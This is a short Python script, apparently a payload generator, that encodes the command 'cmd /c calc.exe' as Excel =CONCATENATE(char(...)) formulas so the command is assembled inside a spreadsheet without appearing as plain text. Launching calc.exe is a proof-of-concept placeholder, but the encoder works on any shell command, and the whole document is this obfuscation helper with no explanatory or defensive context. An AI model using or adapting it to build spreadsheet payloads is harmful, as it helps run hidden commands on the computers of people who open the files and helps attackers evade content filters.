command = "cmd /c calc.exe"
text = ""
liner = 1
for i in command:

    text += "char(" + str(ord(i))+"),"
    if liner ==15 :
        text = text[0:-1]
        print ("=CONCATENATE(" + text + ")")
        liner = 1
        text =""
    liner+=1
if liner != 1:
     text = text[0:-1]
     print ("=CONCATENATE(" + text + ")")





